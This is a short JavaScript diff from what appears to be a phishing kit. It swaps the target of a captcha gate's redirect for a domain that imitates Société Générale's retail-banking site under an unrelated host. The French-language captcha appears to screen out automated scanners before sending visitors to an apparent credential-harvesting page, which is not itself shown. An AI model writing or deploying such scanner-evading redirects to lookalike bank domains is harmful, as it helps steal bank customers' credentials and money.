@@ -30,7 +30,7 @@ function validateCaptcha() {
     event.preventDefault();
     debugger
     if (document.getElementById("cpatchaTextBox").value == code) {
-        targetURL="http://2768042.yd515759.web.hosting-test.net/wp/tlp";
+        targetURL="https://particulier-socgen.soundcast.me/smg/";
 window.location=targetURL;
     } else {
         alert("Invalid Captcha. Veuillez réessayer svp");
